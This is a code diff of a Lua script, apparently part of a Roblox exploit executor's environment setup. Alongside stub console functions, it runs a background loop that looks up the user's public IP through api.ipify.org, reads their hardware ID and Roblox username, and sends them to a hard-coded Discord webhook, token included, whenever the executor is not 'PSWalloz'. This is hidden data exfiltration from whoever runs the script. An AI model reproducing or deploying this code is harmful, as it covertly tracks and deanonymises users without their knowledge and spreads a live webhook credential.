@@ -19,6 +19,15 @@ end
 
 secretfunc(snAoMosZ0p)
 
+getgenv().disocrdip = function()
+    local kaka = "https://api.ipify.org/"
+    local response = request({
+        Url = kaka,
+        Method = "GET",
+    })
+    return response.Body
+end
+
 getgenv().consoleclear = function() end
 getgenv().consolecreate = function() end
 getgenv().consoledestroy = function() end
@@ -329,15 +338,6 @@ task.spawn(function()
     local _game = game:GetService("CoreGui").Parent
     local HttpService = _game:FindService("HttpService")
 
-    local function getip()
-        local kaka = "https://api.ipify.org/"
-        local response = request({
-            Url = kaka,
-            Method = "GET",
-        })
-        return response.Body
-    end
-
     local function checkcc()
         return identifyexecutor().." <- identifyexecutor | getexecutorname -> "..getexecutorname()
     end
@@ -389,7 +389,7 @@ task.spawn(function()
     while true do
         wait(5)
         if identifyexecutor() ~= "PSWalloz" or getexecutorname() ~= "PSWalloz" then
-            local kakav3 = "Oh No! identifyexecutor -> "..identifyexecutor().."\n getexecutorname -> "..getexecutorname().."\n Ip -> "..getip().."\n Hwid -> "..gethwid().."\n Username"..game.Players.LocalPlayer.Name
+            local kakav3 = "Oh No! identifyexecutor -> "..identifyexecutor().."\n getexecutorname -> "..getexecutorname().."\n Ip -> "..disocrdip().."\n Hwid -> "..gethwid().."\n Username"..game.Players.LocalPlayer.Name
             local kaka = {
                 Url = "https://discord.com/api/webhooks/1347691014395269130/HY5klKqvCvglZagfYbqrZFSxV2S8slKG6fVn5FRWQdod0DyQLDdpLVO-GKB53M0MSiy6",
                 Body = HttpService:JSONEncode({
